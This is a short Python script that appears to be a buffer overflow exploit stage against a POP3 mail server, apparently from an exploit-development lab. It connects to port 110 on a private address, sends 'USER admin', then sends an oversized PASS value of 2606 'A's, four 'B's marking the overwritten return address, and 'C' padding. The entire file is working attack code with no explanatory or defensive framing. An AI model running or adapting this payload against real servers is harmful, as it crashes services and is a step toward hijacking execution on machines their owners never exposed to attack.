#!/usr/bin/python3
import socket
data = "A"*2606 + "B"*4 + "C"*(3500-2606-4)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.43.114", 110))
    print(s.recv(1024))
    s.send(b"USER admin\r\n")
    print(s.recv(1024))
    s.send(b"PASS " + bytes(data, encoding="utf-8") + b"\r\n")
    print("Done!")
except:
    print("could not connect to pop3")
